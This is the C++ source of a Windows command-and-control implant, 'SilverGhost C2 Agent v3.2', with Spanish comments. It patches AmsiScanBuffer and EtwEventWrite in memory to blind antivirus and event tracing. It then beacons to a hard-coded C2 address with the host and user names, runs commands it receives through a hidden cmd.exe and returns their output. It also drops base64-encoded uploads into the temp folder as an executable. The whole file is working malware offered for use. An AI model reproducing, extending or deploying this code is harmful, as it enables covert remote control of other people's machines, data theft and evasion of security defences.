/*
 * SilverGhost C2 Agent v3.2 - CON OUTPUT
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

#define C2_SERVER "192.168.254.146"
#define C2_PORT 9090

// ========== BASE64 ==========
static const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string b64encode(const std::vector<BYTE>& data) {
    std::string result;
    int val = 0, valb = -6;
    for (BYTE c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(b64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) result.push_back(b64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (result.size() % 4) result.push_back('=');
    return result;
}

std::vector<BYTE> b64decode(const std::string& data) {
    std::vector<BYTE> result;
    int val = 0, valb = -8;
    for (char c : data) {
        if (c == '=') break;
        int idx = strchr(b64_chars, c) - b64_chars;
        val = (val << 6) + idx;
        valb += 6;
        if (valb >= 0) {
            result.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return result;
}

// ========== BYPASS ==========
void DisableDefenses() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        BYTE* pFunc = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pFunc) {
            DWORD oldProt;
            VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &oldProt);
            BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3, 0x00, 0x00};
            memcpy(pFunc, patch, 8);
            VirtualProtect(pFunc, 8, oldProt, &oldProt);
        }
    }
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        BYTE* pEtw = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
        if (pEtw) {
            DWORD oldProt;
            VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProt);
            *pEtw = 0xC3;
            VirtualProtect(pEtw, 1, oldProt, &oldProt);
        }
    }
}

// ========== EJECUTAR COMANDO Y CAPTURAR OUTPUT ==========
std::string ExecuteCommand(const std::string& cmd) {
    std::string output;
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    if (CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hPipeWrite;
        si.hStdError = hPipeWrite;
        si.wShowWindow = SW_HIDE;
        
        std::string full_cmd = "cmd.exe /c \"" + cmd + "\" 2>&1";
        if (CreateProcessA(NULL, (LPSTR)full_cmd.c_str(), NULL, NULL, TRUE, 
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hPipeWrite);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                output += buffer;
            }
            CloseHandle(hPipeRead);
            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    return output;
}

// ========== UPLOAD ==========
bool HandleUpload(const std::string& response) {
    size_t start = response.find("FromBase64String('") + 17;
    size_t end = response.find("');", start);
    if (start == std::string::npos || end == std::string::npos) return false;
    
    std::string b64data = response.substr(start, end - start);
    std::vector<BYTE> filedata = b64decode(b64data);
    
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string filePath = std::string(tempPath) + "uploaded_agent.exe";
    
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, filedata.data(), filedata.size(), &written, NULL);
        CloseHandle(hFile);
        return true;
    }
    return false;
}

// ========== BEACON CON OUTPUT ==========
void Beacon() {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    std::string output_buffer;  // Buffer para guardar output de comandos
    
    while (true) {
        HINTERNET hConnect = InternetConnectA(hSession, C2_SERVER, C2_PORT, NULL, NULL, 
                                              INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, 
                                                  INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
            if (hRequest) {
                // Enviar beacon (incluir output pendiente si existe)
                std::string beacon_data = std::string(hostname) + "|" + username + "|Windows";
                if (!output_buffer.empty()) {
                    beacon_data += "|OUTPUT:" + output_buffer;
                    output_buffer.clear();
                }
                
                HttpSendRequestA(hRequest, "Content-Type: text/plain\r\n", -1, 
                                (LPVOID)beacon_data.c_str(), beacon_data.length());
                
                char buffer[32768];
                DWORD bytesRead;
                std::string response;
                
                while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    response += buffer;
                }
                
                // Limpiar headers HTTP
                size_t body_start = response.find("\r\n\r\n");
                if (body_start != std::string::npos) {
                    response = response.substr(body_start + 4);
                }
                
                // Detectar upload
                if (response.find("FromBase64String") != std::string::npos) {
                    HandleUpload(response);
                }
                // Ejecutar comando normal y guardar output
                else if (!response.empty() && response.find("JDEXPLOIT_ACTIVE") == std::string::npos) {
                    output_buffer = ExecuteCommand(response);
                }
                
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        Sleep(4000 + (rand() % 4000));
    }
    InternetCloseHandle(hSession);
}

// ========== ENTRY ==========
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    Sleep(2000);
    DisableDefenses();
    Beacon();
    return 0;
}
